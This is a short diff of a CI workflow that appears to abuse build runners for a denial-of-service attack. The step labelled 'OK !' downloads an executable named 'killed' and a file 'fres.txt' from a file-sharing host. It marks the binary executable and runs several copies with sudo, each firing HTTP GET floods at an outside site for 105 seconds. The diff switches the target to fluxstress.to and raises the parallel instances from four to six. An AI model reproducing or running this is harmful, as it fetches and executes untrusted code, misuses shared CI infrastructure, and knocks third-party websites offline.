@@ -15,12 +15,12 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/gSkor/killed
-          wget https://curl.by/JS8OC/fres.txt
+          wget https://curl.by/--ayB/killed
+          wget https://curl.by/zhBrO/fres.txt
           chmod +x killed
           PIDS=()
-          for i in {1..4}; do
-            sudo timeout 105 ./killed GET https://graph.vshield.pro/ fres.txt 100 128 10 &
+          for i in {1..6}; do
+            sudo timeout 105 ./killed GET https://fluxstress.to/assets/favicon.ico fres.txt 100 128 10 &
             PIDS+=($!)
           done
           
